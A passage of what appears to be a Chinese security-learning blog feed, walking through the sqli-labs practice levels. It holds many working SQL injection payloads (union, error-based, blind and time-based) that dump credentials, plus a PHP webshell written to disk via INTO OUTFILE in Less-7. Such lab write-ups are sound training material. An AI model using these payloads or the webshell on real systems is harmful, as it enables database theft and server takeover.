alt="6"></p><p>查看源代码确定为单引号注入。</p><h4 id="2-爆库"><a href="#2-爆库" class="headerlink" title="2.爆库"></a>2.爆库</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/5.jpg" alt="5"></p><h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from  information_schema.tables and table_schema=database()))) or &#39;1&#39;=&#39;1</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/8.jpg" alt="8"></p><h4 id="4-爆列"><a href="#4-爆列" class="headerlink" title="4.爆列"></a>4.爆列</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;)))  or &#39;1&#39;=&#39;1</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/9.jpg" alt="9"></p><h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))  or&#39;1&#39;=&#39;1 </code><img src="/2020/11/26/sqli-labs%E5%9B%9B/10.jpg" alt="10"></p><p>遇到之前的老问题数据显示不全，可用limit0,1;来遍历或者使用not in()：</p><p><code>&#39; or extractvalue(1,concat(0x7e,(select  group_concat(username,0x3a,password) from users where username not in  (&#39;Dumb&#39;,&#39;Angelinal&#39;)))) or &#39; </code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/11.jpg" alt="11"></p><p>不过这种方法也很麻烦。</p><p>updatexml()类似。</p><h3 id="floor"><a href="#floor" class="headerlink" title="floor():"></a>floor():</h3><p><code>&#39; and (select 1 from (select  count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2))as a from  information_schema.tables group by a) b)  and &#39;</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/12.jpg" alt="12"></p><p>也可使用时间盲注。</p><h3 id="二-HTTP-Header-Live"><a href="#二-HTTP-Header-Live" class="headerlink" title="(二)HTTP Header Live"></a>(二)HTTP Header Live</h3><p>HTTP Header Live是Firefox中的插件，可在其中对user-agent 进行修改。</p><h3 id><a href="#" class="headerlink" title></a><img src="/2020/11/26/sqli-labs%E5%9B%9B/13.jpg" alt="13"></h3><h3 id="（三）Live-HTTP-headers"><a href="#（三）Live-HTTP-headers" class="headerlink" title="（三）Live HTTP headers"></a>（三）Live HTTP headers</h3><p>Live HTTP headers也是Firefox里的插件，但是需要安装低版本火狐，测试安装的是45.0版本浏览器。这篇博客有详细教程：<a href="https://blog.csdn.net/qq_22146195/article/details/103537148">火狐浏览器安装Live HTTP headers步骤记录</a></p><h3 id="四-Burp-Suite"><a href="#四-Burp-Suite" class="headerlink" title="(四)Burp Suite"></a>(四)Burp Suite</h3><p>Burp Suite 是用于攻击web 应用程序的集成平台，包含许多工具,且这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。<strong>安装burp suite需要java环境</strong></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/14.jpg" alt="14"></p><p>类似工具还有很多不一一列举。</p><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>基于头部的Referer POST报错注入</p><p>成功登陆后会显示referer地址,用户名与18关一样用函数进行处理，故在referer注入。与18关类似。</p><p>仍可用HTTP Header Live：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/15.jpg" alt="15"></p><p>Burp Suite：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/16.jpg" alt="16"></p><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>基于错误的cookie头部POST注入</p><p>从源代码中我们可以看到cookie从username获得值之后，当再次刷新时会从cookie中获取username,然后进行查询。</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/18.jpg" alt="18"></p><p>因为此关为post注入，可使用union联合语句，报错语句。</p><h2 id="法一：union联合语句"><a href="#法一：union联合语句" class="headerlink" title="法一：union联合语句"></a>法一：union联合语句</h2><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探</h4><p>从上图源代码中可以看出本关为单引号注入，也可以试探一下：</p><p>单引号报错</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/19.jpg" alt="19"></p><p>注释掉回显正常</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/20.jpg" alt="20"></p><h4 id="2-判断字段数与回显字段"><a href="#2-判断字段数与回显字段" class="headerlink" title="2.判断字段数与回显字段"></a>2.判断字段数与回显字段</h4><p>使用burp suite抓个包：</p><p><code>uname=admin&#39; order by 4 -- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/21.jpg" alt="21"></p><p>4报错，3回显正常。其实和第一关如出一辙。</p><p><code>uname=1&#39; union select 1,2,3 -- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/22.jpg" alt="22"></p><p>之后就是查库，查表，查列，查值……不再赘述。</p><h2 id="法二：floor"><a href="#法二：floor" class="headerlink" title="法二：floor()"></a>法二：floor()</h2><p><code>uname=1&#39; or (select 1 from (select 1,count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/23.jpg" alt="23"></p><h2 id="法三：updatexml-注入，extractvalue-注入"><a href="#法三：updatexml-注入，extractvalue-注入" class="headerlink" title="法三：updatexml()注入，extractvalue()注入"></a>法三：updatexml()注入，extractvalue()注入</h2><p><code>uname=1&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e),0)-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/24.jpg" alt="24"></p><h2 id="法四：布尔盲注"><a href="#法四：布尔盲注" class="headerlink" title="法四：布尔盲注"></a>法四：布尔盲注</h2><p><code>uname=admin&#39; and left((select database()),8)=&#39;security&#39;-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/27.jpg" alt="27"></p><p>报错时页面：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/26.jpg" alt="26"></p><h2 id="法五：延时注入"><a href="#法五：延时注入" class="headerlink" title="法五：延时注入"></a>法五：延时注入</h2><p><code>uname=admin&#39; and if(length(database())=8,1,sleep(5))-- #</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/28.jpg" alt="28"></p><p>用burp suite 抓包报错会一直延时，hackbar正常延时，报错页面如下：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/29.jpg" alt="29"></p><h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><p>基于base64编码单引号和括号的Cookie注入</p><p>本关和Less-20相似，cookie从username获得值之后，再次刷新时会从cookie中获取username,再进行查询,只是cookie的uname值需经过base64编码。</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/32.jpg" alt="32"></p><p>推荐一个编码器<a href="https://base64.us/">Base64 在线编码解码</a>，admin的编码为YWRtaW4=</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/31.jpg" alt="31"></p><p>单引号报错：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/33.jpg" alt="33"></p><p><code>&#39;)</code>也报错，用#注释后回显正常。其余操作与20关相同，将命令编码即可。</p><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>登录成功后显示的是21关的图片，应该是作者弄错了。</p><p>双引号报错</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/34.jpg" alt="34"></p><p>注释后回显正常</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/35.jpg" alt="35"></p><p>接下去就跟21类似。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(三)</title>
    <link href="/2020/11/22/sqli-labs%E4%B8%89/"/>
    <url>/2020/11/22/sqli-labs%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-三"><a href="#sqli-labs-三" class="headerlink" title="sqli-labs(三)"></a>sqli-labs(三)</h1><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>less-11为post注入，post就是数据从客户端提交到服务器端,输入用户名和密码会以表单的形式提交到服务器进行验证。</p><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h4><p>用之前的1无反应，试着使用常用的管理员密码账户 admin(Dumb也行)，成功登录；加单引号注入，密码随意，报错。</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/1.jpg" alt="1"></p><p>根据报错可以判断出该处为单引号注入，使用万能密码<code>admin&#39;or&#39;1&#39;=&#39;1#</code>（or ‘1’=’1恒成立，所以语句恒真）将其注释；回显正常，确定为单引号注入。</p><h4 id="2-爆库名"><a href="#2-爆库名" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p>用<code>union select 1,database()-- #</code>查询，语句放在用户名或密码都可以。</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/2.jpg" alt="2"></p><h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p>接下来步骤与前面关卡类似</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/3.jpg" alt="3"></p><h4 id="4-爆字段"><a href="#4-爆字段" class="headerlink" title="4.爆字段"></a>4.爆字段<img src="/2020/11/22/sqli-labs%E4%B8%89/4.jpg" alt="4"></h4><h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值<img src="/2020/11/22/sqli-labs%E4%B8%89/5.jpg" alt="5"></h4><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>试探出该处为双引号闭合注入，其余步骤类似。</p><h2 id><a href="#" class="headerlink" title></a><img src="/2020/11/22/sqli-labs%E4%B8%89/6.jpg" alt="6"></h2><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探<img src="/2020/11/22/sqli-labs%E4%B8%89/7.jpg" alt="7"></h4><p>查询源代码可知该关卡登录成功只返回图片不返回结果；因此可采用布尔盲注或时间盲注。</p><h4 id="2-爆库名-1"><a href="#2-爆库名-1" class="headerlink" title="2.爆库名"></a>2.爆库名<img src="/2020/11/22/sqli-labs%E4%B8%89/8.jpg" alt="8"></h4><h4 id="3-爆表-1"><a href="#3-爆表-1" class="headerlink" title="3.爆表"></a>3.爆表<img src="/2020/11/22/sqli-labs%E4%B8%89/9.jpg" alt="9"></h4><p>接下去与less-6提到的报错步骤相似，不再赘述。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><h4 id="1-试探-2"><a href="#1-试探-2" class="headerlink" title="1.试探"></a>1.试探<img src="/2020/11/22/sqli-labs%E4%B8%89/10.jpg" alt="10"></h4><p>其余与上述关卡类似。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><h4 id="1-试探-3"><a href="#1-试探-3" class="headerlink" title="1.试探"></a>1.试探</h4><p>本关可以使用布尔盲注或时间注入。</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/11.jpg" alt="11"></p><p><strong>注意</strong>:&amp;passwd=1不能少，因为后台源码中设置uname和passwd这两个参数任何一个都不能为空，一旦其中一个为空将不会执行SQL语句</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/15.jpg" alt="15"></p><h4 id="2-爆库名-2"><a href="#2-爆库名-2" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p>库名：</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/16.jpg" alt="16"></p><p>之后语句皆与less-8一样。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16<img src="/2020/11/22/sqli-labs%E4%B8%89/12.jpg" alt="12"></h2><p>其余与15关类似。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>先看源代码</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/18.jpg" alt="18"></p><p>uname用check_input()函数进行了处理，只截取15个字符；</p><p>get_magic_quotes_gpc()用于判断解析用户提示的数据，特别是post、get、cookie过来的数据增加转义字符“\”。</p><p>stripslashes()删除由 addslashes() 函数添加的反斜杠</p><p>ctype_digit()判断是不是数字，是数字就返回true，否则返回false</p><p>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符。</p><p>intval()   整型转换一系列过滤过于麻烦，故从password注入。</p><h4 id="1-试探-4"><a href="#1-试探-4" class="headerlink" title="1.试探"></a>1.试探</h4><p><img src="/2020/11/22/sqli-labs%E4%B8%89/19.jpg" alt="19"></p><p>确定为单引号注入。</p><h4 id="2-爆库名-3"><a href="#2-爆库名-3" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p>之前报错试过updatexml，这关试看看floor()和extractvalue()。</p><p>floor()：比较麻烦</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/20.jpg" alt="20"></p><p>extractvalue()：与updatexml相似</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/22.jpg" alt="22"></p><p>其余步骤不再赘述。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（二）</title>
    <link href="/2020/11/09/sqli-labs/"/>
    <url>/2020/11/09/sqli-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs–2"><a href="#Sqli-labs–2" class="headerlink" title="Sqli-labs–2"></a>Sqli-labs–2</h1><ul><li><a href="#sqli-labs--2">Sqli-labs–2</a><ul><li><a href="#%E6%B3%95%E4%B8%80%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">法一:联合注入</a><ul><li><a href="#%E7%9B%B2%E6%B3%A8%E7%8C%9C%E8%A7%A3less-5">盲注猜解Less-5</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2">1.试探:</a></li><li><a href="#2%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6">2.<strong>猜数据库名长度</strong>:</a></li><li><a href="#3%E7%8C%9C%E5%BA%93%E5%90%8D">3.<strong>猜库名：</strong></a></li><li><a href="#4%E7%88%86%E8%A1%A8"><strong>4.爆表：</strong></a></li><li><a href="#5%E7%88%86%E5%88%97"><strong>5.爆列：</strong></a></li><li><a href="#6%E7%88%86%E5%80%BC"><strong>6.爆值：</strong></a></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%BA%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">法二：报错注入</a><ul><li><a href="#less-6">Less-6</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-1">1.试探</a></li><li><a href="#2%E7%88%86%E5%BA%93%E5%90%8D">2.爆库名</a></li><li><a href="#3%E7%88%86%E8%A1%A8">3.爆表</a></li><li><a href="#4%E7%88%86%E5%88%97">4.爆列</a></li><li><a href="#5%E7%88%86%E5%80%BC">5.爆值</a></li></ul></li><li><a href="#less-7">Less-7</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-2">1.试探</a></li><li><a href="#2%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">2.获取文件路径</a><ul><li><a href="#%E6%B3%95%E4%B8%80">法一：</a></li><li><a href="#%E6%B3%95%E4%BA%8C">法二：</a></li></ul></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%B8%89%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">法三：时间盲注</a></li><li><a href="#less-8">Less-8</a><ul><li><a href="#1%E8%AF%95%E6%8E%A2-3">1.试探</a></li><li><a href="#2%E7%88%86%E5%BA%93%E9%95%BF">2.爆库长</a></li><li><a href="#3%E7%88%86%E5%BA%93">3.爆库</a></li><li><a href="#4%E7%88%86%E8%A1%A8-1">4.爆表</a></li><li><a href="#5%E7%88%86%E5%88%97-1">5.爆列</a></li><li><a href="#6%E7%88%86%E5%80%BC-1">6.爆值</a><ul><li><a href="#less-9">Less-9</a></li><li><a href="#less-10">Less-10</a></li></ul></li></ul></li></ul></li></ul><h2 id="法一-联合注入"><a href="#法一-联合注入" class="headerlink" title="法一:联合注入"></a>法一:联合注入</h2><h3 id="盲注猜解Less-5"><a href="#盲注猜解Less-5" class="headerlink" title="盲注猜解Less-5"></a>盲注猜解Less-5</h3><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探:"></a>1.试探:</h4><p>插入<code>?id=1&#39;</code>报错，但未报错时页面并没有任何信息的回显；执行SQL语句后，若语句查询到匹配的数据会显示‘You are in……如果SQL语句没有查询到匹配的数据就不回显；如果语句有错误就显示错误的信息；故判断其为盲注。前四节都是通过闭合sql语句注入，这里只能通过数据库报错来获取想要的数据，原理：将group by与一个聚合函数一起使用，如count(*)，可以将想要查询的内容作为错误信息返回。</p><h4 id="2-猜数据库名长度"><a href="#2-猜数据库名长度" class="headerlink" title="2.猜数据库名长度:"></a>2.<strong>猜数据库名长度</strong>:</h4><p><code>’ and length (database())=8--+</code>试到8时回显正常</p><p><img src="/2020/11/09/sqli-labs/1.jpg" alt="1"></p><h4 id="3-猜库名："><a href="#3-猜库名：" class="headerlink" title="3.猜库名："></a>3.<strong>猜库名：</strong></h4><p><code>&#39; and left((select database()),1)=&#39;s&#39;--+</code>回显正常，再探寻第二个字母<code>&#39; and left((select database()),2)=&#39;sy&#39;--+</code>报错：</p><p><img src="/2020/11/09/sqli-labs/3.jpg" alt="3"></p><p>将y换成e后正常，依次推出八位数（经漫长的试探…….）得出库名security。security的十六进制=<strong>0x7365637572697479</strong></p><h4 id="4-爆表："><a href="#4-爆表：" class="headerlink" title="4.爆表："></a><strong>4.爆表：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p><p><img src="/2020/11/09/sqli-labs/4.jpg" alt="4"></p><h4 id="5-爆列："><a href="#5-爆列：" class="headerlink" title="5.爆列："></a><strong>5.爆列：</strong></h4><p><code> union Select 1,count(*),concat(0x3a,0x3a,( select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=&#39;users&#39; limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/5.jpg" alt="5"></p><h4 id="6-爆值："><a href="#6-爆值：" class="headerlink" title="6.爆值："></a><strong>6.爆值：</strong></h4><p><code>union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code><img src="/2020/11/09/sqli-labs/6.jpg" alt="6"></p><h2 id="法二：报错注入"><a href="#法二：报错注入" class="headerlink" title="法二：报错注入"></a>法二：报错注入</h2><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探</h4><p>用<code>?id=1&quot;</code>时报错，加上<code>--+</code>时回显正常。</p><h4 id="2-爆库名"><a href="#2-爆库名" class="headerlink" title="2.爆库名"></a>2.爆库名</h4><p><code>and updatexml(1,concat(0x7e,database(),0x7e),1)%23 </code>(0x7e是十六进制的“~”)</p><p><img src="/2020/11/09/sqli-labs/10.jpg" alt="10"></p><h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</code></p><p><img src="/2020/11/09/sqli-labs/11.jpg" alt="11"></p><h4 id="4-爆列"><a href="#4-爆列" class="headerlink" title="4.爆列"></a>4.爆列</h4><p><code>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),0x7e),1)%23</code></p><p><img src="/2020/11/09/sqli-labs/12.jpg" alt="12"></p><h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><p><code>and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23</code>因updatexml()函数最多只能爆32个字符故用<code>limit 0,1</code>一一查询</p><p><img src="/2020/11/09/sqli-labs/13.jpg" alt="13"></p><p><img src="/2020/11/09/sqli-labs/18.jpg" alt="18"></p><p>……还有很多，不一一列举。</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><h4 id="1-试探-2"><a href="#1-试探-2" class="headerlink" title="1.试探"></a>1.试探</h4><p>输入<code>id=1&#39;</code>报错，用–+注释掉后仍报错；尝试加一个括号，还是报错，再加一个，回显正常。<img src="/2020/11/09/sqli-labs/8.jpg" alt="8"></p><h4 id="2-获取文件路径"><a href="#2-获取文件路径" class="headerlink" title="2.获取文件路径"></a>2.获取文件路径</h4><p>科普小知识：</p><p>@@datadir 读取数据库路径;@@basedir MYSQL 获取安装路径</p><p>一句话木马:本关用到php版本的一句话木马：<code>&lt;?php @eval($_POST[“cmd”]);?&gt; </code></p><p>load_file(): 读取本地文件; into outfile :写文件;</p><p>用命令<code>union select 1,@@basedir,@@datadir --+</code>在低关卡查询文件的相对路径<img src="/2020/11/09/sqli-labs/9.jpg" alt="9"></p><h6 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h6><p>根据以上查询的文件地址使用<code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\WWW\\sql\\hhh.php&quot;--+</code>语句新建php文件便于后续闯关。(<strong>路径需要用<code>\\</code>这点一定要记住</strong>)</p><p>蚁剑:</p><p><img src="/2020/11/09/sqli-labs/26.jpg" alt="26"></p><p>注：密码为木马语句post框里的内容。</p><p>打开：</p><p><img src="/2020/11/09/sqli-labs/27.jpg" alt="27"></p><p>也可以用菜刀：</p><p><img src="/2020/11/09/sqli-labs/28.jpg" alt="28"></p><p>路径里的文件名一定要对，我刚开始下了菜刀，然后看了一个教程里面对文件命名为test.php;我自己命名为hhh.php，然后再编辑数据的时候输入了test.php……为此我还觉得是菜刀出了问题，然后下了蚁剑，还是不行，最后发现我的文件名错了！！!因为这个憨憨问题，我从13号晚上开始困惑了一天……</p><h6 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h6><p>使用<code>?id=1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;--+</code></p><p>可以在目录下发现text.php文件</p><p><img src="/2020/11/09/sqli-labs/19.jpg" alt="19"></p><p>爆数据库名</p><p><code>union select 1,user(),database() into outfile D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\a.php&quot;</code><img src="/2020/11/09/sqli-labs/21.jpg" alt="21"></p><p>爆表</p><p><code>union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; into outfile</code></p><p><img src="/2020/11/09/sqli-labs/22.jpg" alt="22"></p><p>爆字段</p><p><code>union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile</code><img src="/2020/11/09/sqli-labs/23.jpg" alt="23"></p><p>爆值</p><p><code>union select * from users into outfile</code><img src="/2020/11/09/sqli-labs/24.jpg" alt="24"></p><h2 id="法三：时间盲注"><a href="#法三：时间盲注" class="headerlink" title="法三：时间盲注"></a>法三：时间盲注</h2><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h4 id="1-试探-3"><a href="#1-试探-3" class="headerlink" title="1.试探"></a>1.试探</h4><p><code>id=1&#39;</code>报错，用<code>--+</code>注释后回显正常。（其实标题就看得出来……）</p><h4 id="2-爆库长"><a href="#2-爆库长" class="headerlink" title="2.爆库长"></a>2.爆库长</h4><p><code>?id=1&#39; and if(length(database())=8,sleep(5),1)--+</code><img src="/2020/11/09/sqli-labs/25.jpg" alt="25"></p><p>图中圈圈在值为8的时候延迟了，故值为8</p><h4 id="3-爆库"><a href="#3-爆库" class="headerlink" title="3.爆库"></a>3.爆库</h4><p><code>?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+</code></p><p>与上述一样故值为s;接着增加left(database(),字符长度)中的字符长度，等号右边依次爆破下一个字符，正确匹配时会延迟，（经过漫长试探）最终爆破得到left(database(),8)=’security’。</p><h4 id="4-爆表"><a href="#4-爆表" class="headerlink" title="4.爆表"></a>4.爆表</h4><p><code>?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#39;users&#39; ,sleep(5),1)--+</code></p><p>得出表名为users。</p><h4 id="5-爆列"><a href="#5-爆列" class="headerlink" title="5.爆列"></a>5.爆列</h4><p><code>?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 5,1),8)=&#39;password&#39; ,sleep(5),1) --+</code></p><p>在limit5,1的时候查到了password，在limit4,1时查到了username.</p><h4 id="6-爆值"><a href="#6-爆值" class="headerlink" title="6.爆值"></a>6.爆值</h4><p><code>?id=1&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+</code></p><p><code>?id=1&#39; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+</code></p><p>所以第一个用户的名字dumb，密码dumb；在经过漫长的尝试依次查出其余的值。</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>输入一系列符号，发现一直you are in ……;判断为时间盲注。输入<code>?id=1&#39; and sleep(5) --+</code>所以为单引号盲注。接下去和第八关的时间盲注步骤相似。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>试探为时间盲注，<code>?id=1&quot; and sleep(5) --+</code>延迟，故为双引号盲注，接下去与第八关相似。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（一）</title>
    <link href="/2020/11/08/sqli/"/>
    <url>/2020/11/08/sqli/</url>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h1><p>本篇文章运用的注入语句已在sqli基础中说明，故运用时不再解释原因。</p><h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><ol><li><code>?id=1 and 1=2 --+</code>若返回结果正常，说明不是数字类型；</li><li><code>?id=1&#39; --+</code> 显示不正常,<code>?id=1&#39;) --+ </code>显示正常时，该类型为字符注入，且以(‘’)的方式闭合字符串，还有(“”)类似。</li></ol><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h4 id="法一：UNION联合查询注入"><a href="#法一：UNION联合查询注入" class="headerlink" title="法一：UNION联合查询注入"></a>法一：UNION联合查询注入</h4><ol><li>用and 1=2测试 ，页面回显正常，所以该地方不是数值查询。</li><li>尝试在id后面加上’，页面回显不正常，可能存在SQL字符注入。</li><li>用–+将sql后面的语句注视掉后，页面回显正常，则证明这个地方是单引号字符型注入</li><li>使用order by 语句判断有几列数据；order by 3页面回显正常，order by 4页面回显不正常，说明此表一个有3列。</li><li>将id=1改为一个数据库不存在的id值，如-1（当用id=1的时候执行的结果只有一条记录，因为在 index.php 中并没有循环取出数据，<strong>故让第一行查询的结果是空集，union右边的查询结果自然就成为了第一行</strong>，打印在网页上了，id一般是数字，从1开始自增的，可把id值设为非正数（负数或0），浮点数，字符型或字符串）使用union select 1,2,3联合查询语句查看页面是否有显示位。<img src="/2020/11/08/sqli/11.jpg" alt="11"></li></ol><p>输出结果说明页面有2个显示位。</p><p>6.用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息。</p><p><strong>查询数据库名:</strong></p><p> <code>union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><img src="/2020/11/08/sqli/12.jpg" alt="12"></p><p><strong>查询所有表名:</strong></p><p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code><img src="/2020/11/08/sqli/13.jpg" alt="13"></p><p><strong>查列名：</strong></p><p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p><p><img src="/2020/11/08/sqli/14.jpg" alt="14"></p><p><strong>查询用户名，密码:</strong></p><p><code>union select 1,group_concat(username,0x3a,password),3 from users --+</code></p><p><img src="/2020/11/08/sqli/15.jpg" alt="15"></p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><h4 id="法二：报错型注入"><a href="#法二：报错型注入" class="headerlink" title="法二：报错型注入"></a>法二：报错型注入</h4><p>因less1-4的步骤类似，故报错型注入以less3为例。</p><p>输入单引号报错，输入 –+后仍报错，故不是简单的单引号报错；输入<code>?id=1&#39;) --+ </code>回显示正常，则证明less-3属于以(‘’)的方式闭合字符串。</p><p><strong>爆表</strong></p><p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</code></p><p><img src="/2020/11/08/sqli/16.jpg" alt="16"></p><p><strong>爆列</strong></p><p><code>and%201=extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%20--+</code><img 